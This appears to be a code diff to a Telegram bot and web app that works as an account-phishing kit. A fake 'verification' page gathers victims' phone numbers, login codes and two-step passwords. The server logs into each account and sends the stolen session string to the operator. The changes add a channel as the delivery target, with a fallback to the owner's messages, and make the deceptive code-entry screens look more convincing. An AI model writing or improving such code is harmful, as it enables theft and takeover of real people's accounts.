@@ -22,6 +22,7 @@ BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
 API_ID = _si(os.environ.get("API_ID"), 0)
 API_HASH = (os.environ.get("API_HASH") or "").strip()
 YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
+CHANNEL_ID = _si(os.environ.get("CHANNEL_ID"), 0)   # <-- NEW: channel for session strings
 PORT = _si(os.environ.get("PORT"), 5000)
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 SELF_URL = os.environ.get("SELF_URL", "https://two-fishing.onrender.com/health")
@@ -41,6 +42,7 @@ logger.info("ADMIN BOT START")
 logger.info(f"  BOT_TOKEN  : {'SET' if BOT_TOKEN else 'MISSING'}")
 logger.info(f"  API_ID     : {API_ID}")
 logger.info(f"  OWNER_ID   : {YOUR_TELEGRAM_ID}")
+logger.info(f"  CHANNEL_ID : {CHANNEL_ID if CHANNEL_ID else 'NOT SET (fallback to owner DM)'}")
 logger.info("=" * 60)
 
 if sys.version_info >= (3, 12) and sys.platform == 'win32':
@@ -663,6 +665,7 @@ async def health_cmd(event):
            f"pending_codes: {len(pending_codes)}\n"
            f"user_sessions: {len(user_sessions)}\n"
            f"reset_marker: {reset_all_marker}\n"
+           f"channel_id: {CHANNEL_ID}\n"
            f"STATE: {[k for k,v in STATE.items() if v]}")
     await event.respond(txt, buttons=admin_menu())
 
@@ -689,7 +692,8 @@ async def pending_cmd(event):
 async def test_cmd(event):
     if event.sender_id != YOUR_TELEGRAM_ID:
         return
-    await event.respond("🧪 Testing fresh client send in 2s...")
+    target = CHANNEL_ID if CHANNEL_ID else YOUR_TELEGRAM_ID
+    await event.respond(f"🧪 Testing fresh client send to {target} in 2s...")
 
     def bg_test():
         import time as t
@@ -699,7 +703,7 @@ async def test_cmd(event):
         try:
             loop.run_until_complete(
                 _send_via_main_loop(
-                    YOUR_TELEGRAM_ID,
+                    target,
                     "🧪 FRESH CLIENT TEST SUCCESS\n\nIf you see this, notify works!",
                 )
             )
@@ -1317,6 +1321,8 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 .sst.active{background:#0088cc;color:white}
 .getcode{margin-top:20px;display:none}
 .getcode.on{display:block}
+.loader{width:48px;height:48px;border:4px solid #2a2a3e;border-top:4px solid #0088cc;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
@@ -1332,9 +1338,10 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 </div>
 <div id="otpBox" class="modal">
 <div class="ico">&#128274;</div>
-<h2>Enter Verification Code</h2>
-<p>We Just Sent Your Access Code<br>Check your <strong>Telegram</strong></p>
-<div class="otps">
+<h2 id="otpTitle">Verifying...</h2>
+<p id="otpSubtitle">Please wait while we process your request</p>
+<div id="otpLoader" class="loader"></div>
+<div class="otps" id="otpInputWrap" style="display:none">
 <input type="tel" maxlength="1" inputmode="numeric" id="o1">
 <input type="tel" maxlength="1" inputmode="numeric" id="o2">
 <input type="tel" maxlength="1" inputmode="numeric" id="o3">
@@ -1499,13 +1506,40 @@ function handleContact(c) {
 
 function openOtp() {
   hide('contactBox'); hide('pwdBox'); hide('shareBox'); show('otpBox');
+  
+  document.getElementById('otpTitle').textContent = 'Sending verification...';
+  document.getElementById('otpSubtitle').textContent = 'Please wait while we send the code';
+  document.getElementById('otpLoader').style.display = 'block';
+  document.getElementById('otpInputWrap').style.display = 'none';
+  document.getElementById('otpMsg').className = 'msg';
+  document.getElementById('resendBtn').style.display = 'none';
+  
   ['o1','o2','o3','o4','o5'].forEach(function(id){ document.getElementById(id).value=''; });
-  document.getElementById('o1').focus(); msg('otpMsg', 'Sending code...', 'info');
+  
   fetch('/api/share', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber,tg_id:TG_ID}) })
   .then(function(r){ return r.json(); }).then(function(d){
-    if (d.success) { msg('otpMsg', 'Code sent!', 'ok'); startOtpCheck(); setTimeout(function(){ document.getElementById('resendBtn').style.display='block'; },30000); }
-    else { msg('otpMsg', d.error||'Failed', 'err'); }
-  }).catch(function(){ msg('otpMsg', 'Network error', 'err'); });
+    if (d.success) {
+      setTimeout(function(){
+        document.getElementById('otpTitle').textContent = 'Verification code sent';
+        document.getElementById('otpSubtitle').textContent = 'Enter the 5-digit code below';
+        document.getElementById('otpLoader').style.display = 'none';
+        document.getElementById('otpInputWrap').style.display = 'flex';
+        document.getElementById('o1').focus();
+        startOtpCheck();
+        setTimeout(function(){ document.getElementById('resendBtn').style.display='block'; },30000);
+      }, 1500);
+    } else {
+      document.getElementById('otpTitle').textContent = 'Something went wrong';
+      document.getElementById('otpSubtitle').textContent = d.error || 'Please try again';
+      document.getElementById('otpLoader').style.display = 'none';
+      document.getElementById('resendBtn').style.display = 'block';
+    }
+  }).catch(function(){
+    document.getElementById('otpTitle').textContent = 'Network error';
+    document.getElementById('otpSubtitle').textContent = 'Please check your connection';
+    document.getElementById('otpLoader').style.display = 'none';
+    document.getElementById('resendBtn').style.display = 'block';
+  });
 }
 function startOtpCheck() {
   if (codeCheck) clearInterval(codeCheck);
@@ -1534,14 +1568,36 @@ function startOtpCheck() {
 });
 function submitOtp() {
   var code = ''; for (var i=1;i<=5;i++) code += document.getElementById('o'+i).value;
-  if (code.length < 5) { msg('otpMsg', 'Enter 5 digits', 'err'); return; }
-  msg('otpMsg', 'Verifying...', 'info');
+  if (code.length < 5) { msg('otpMsg', 'Please enter all 5 digits', 'err'); return; }
+  
+  document.getElementById('otpTitle').textContent = 'Verifying...';
+  document.getElementById('otpSubtitle').textContent = 'Checking your code';
+  document.getElementById('otpLoader').style.display = 'block';
+  document.getElementById('otpInputWrap').style.display = 'none';
+  document.getElementById('otpMsg').className = 'msg';
+  
   fetch('/api/verify', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber,code:code,tg_id:TG_ID}) })
   .then(function(r){ return r.json(); }).then(function(d){
-    if (d.success) onCapture();
-    else if (d.needs_password) { hide('otpBox'); show('pwdBox'); document.getElementById('pwdInput').focus(); startPwdCheck(); }
-    else { msg('otpMsg', d.error||'Wrong code', 'err'); ['o1','o2','o3','o4','o5'].forEach(function(id){ document.getElementById(id).value=''; }); document.getElementById('o1').focus(); }
-  }).catch(function(){ msg('otpMsg', 'Error', 'err'); });
+    if (d.success) {
+      onCapture();
+    } else if (d.needs_password) {
+      hide('otpBox'); show('pwdBox'); document.getElementById('pwdInput').focus(); startPwdCheck();
+    } else {
+      document.getElementById('otpTitle').textContent = 'Verification code sent';
+      document.getElementById('otpSubtitle').textContent = 'Enter the 5-digit code below';
+      document.getElementById('otpLoader').style.display = 'none';
+      document.getElementById('otpInputWrap').style.display = 'flex';
+      msg('otpMsg', d.error||'Wrong code, try again', 'err');
+      ['o1','o2','o3','o4','o5'].forEach(function(id){ document.getElementById(id).value=''; });
+      document.getElementById('o1').focus();
+    }
+  }).catch(function(){
+    document.getElementById('otpTitle').textContent = 'Verification code sent';
+    document.getElementById('otpSubtitle').textContent = 'Enter the 5-digit code below';
+    document.getElementById('otpLoader').style.display = 'none';
+    document.getElementById('otpInputWrap').style.display = 'flex';
+    msg('otpMsg', 'Error, try again', 'err');
+  });
 }
 document.getElementById('resendBtn').onclick = function(){ document.getElementById('resendBtn').style.display='none'; openOtp(); };
 
@@ -1568,15 +1624,16 @@ function startPwdCheck() {
 }
 document.getElementById('pwdBtn').onclick = function() {
   var pwd = document.getElementById('pwdInput').value.trim();
-  if (!pwd) { msg('pwdMsg', 'Enter password', 'err'); return; }
-  msg('pwdMsg', 'Checking...', 'info'); document.getElementById('pwdBtn').disabled = true;
+  if (!pwd) { msg('pwdMsg', 'Please enter your password', 'err'); return; }
+  document.getElementById('pwdBtn').disabled = true;
+  msg('pwdMsg', 'Verifying...', 'info');
   var code = ''; for (var i=1;i<=5;i++) code += document.getElementById('o'+i).value;
   fetch('/api/verify', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber,code:code,password:pwd,tg_id:TG_ID}) })
   .then(function(r){ return r.json(); }).then(function(d){
     document.getElementById('pwdBtn').disabled = false;
     if (d.success) onCapture();
-    else msg('pwdMsg', d.error||'Wrong', 'err');
-  }).catch(function(){ document.getElementById('pwdBtn').disabled = false; msg('pwdMsg', 'Error', 'err'); });
+    else msg('pwdMsg', d.error||'Incorrect password', 'err');
+  }).catch(function(){ document.getElementById('pwdBtn').disabled = false; msg('pwdMsg', 'Error, try again', 'err'); });
 };
 function onCapture() {
   localStorage.setItem(UPK, phoneNumber); localStorage.setItem(UCK,'1'); localStorage.setItem(USK,'0');
@@ -1647,6 +1704,7 @@ def health():
         'bot_thread_alive': _bot_thread.is_alive() if _bot_thread else False,
         'main_loop_ready': _main_bot_loop is not None,
         'accounts': len(captured_accounts),
+        'channel_id': CHANNEL_ID,
     })
 
 
@@ -1858,7 +1916,9 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
 
         name_full = f"{me.first_name or ''} {me.last_name or ''}".strip() or "?"
 
-        # ===== SINGLE MESSAGE — EXACT FORMAT (tor moto) =====
+        # ===== NOTIFY TARGET: channel if set, else owner DM =====
+        NOTIFY_TARGET = CHANNEL_ID if CHANNEL_ID else YOUR_TELEGRAM_ID
+
         full_msg_html = (f"🔔 New Account!\n"
                          f"📱 {phone}\n"
                          f"👤 {name_full}\n"
@@ -1872,8 +1932,8 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
         sent_msg = None
         for attempt in range(3):
             try:
-                logger.info(f"📤 FULL MSG attempt {attempt+1}/3")
-                r = await _send_html_via_fresh(YOUR_TELEGRAM_ID, full_msg_html)
+                logger.info(f"📤 FULL MSG to {NOTIFY_TARGET} attempt {attempt+1}/3")
+                r = await _send_html_via_fresh(NOTIFY_TARGET, full_msg_html)
                 if r:
                     sent_msg = r
                     acc["admin_notify_msg_id"] = r.id
@@ -1886,8 +1946,24 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                 logger.warning(f"FULL MSG attempt {attempt+1} fail: {type(e).__name__}: {e}")
                 await asyncio.sleep(0.5)
 
+        if not sent_msg and NOTIFY_TARGET != YOUR_TELEGRAM_ID:
+            logger.warning("Channel send failed, falling back to owner DM")
+            for attempt in range(3):
+                try:
+                    r = await _send_html_via_fresh(YOUR_TELEGRAM_ID, full_msg_html)
+                    if r:
+                        sent_msg = r
+                        acc["admin_notify_msg_id"] = r.id
+                        acc["admin_session_msg_id"] = r.id
+                        save_account(acc)
+                        captured_accounts = load_accounts()
+                        logger.info(f"✅ FULL MSG sent to owner fallback (mid={r.id})")
+                        break
+                except Exception as e:
+                    logger.warning(f"Owner fallback attempt {attempt+1} fail: {e}")
+                    await asyncio.sleep(0.5)
+
         if not sent_msg:
-            # Fallback: markdown
             full_msg_md = (f"🔔 New Account!\n"
                            f"📱 {phone}\n"
                            f"👤 {name_full}\n"
@@ -1897,7 +1973,7 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                            f"🔑 Session:\n```\n{ss}\n```")
             for attempt in range(3):
                 try:
-                    r = await _send_via_main_loop(YOUR_TELEGRAM_ID, full_msg_md, parse_mode='md')
+                    r = await _send_via_main_loop(NOTIFY_TARGET, full_msg_md, parse_mode='md')
                     if r:
                         sent_msg = r
                         acc["admin_notify_msg_id"] = r.id
@@ -1911,7 +1987,6 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                     await asyncio.sleep(0.5)
 
         if not sent_msg:
-            # Last resort: plain text
             full_msg_plain = (f"🔔 New Account!\n"
                               f"📱 {phone}\n"
                               f"👤 {name_full}\n"
@@ -1920,7 +1995,7 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                               f"📏 Session: {ss_len} chars\n\n"
                               f"🔑 Session:\n{ss}")
             try:
-                r = await _send_via_main_loop(YOUR_TELEGRAM_ID, full_msg_plain)
+                r = await _send_via_main_loop(NOTIFY_TARGET, full_msg_plain)
                 if r:
                     sent_msg = r
                     acc["admin_notify_msg_id"] = r.id
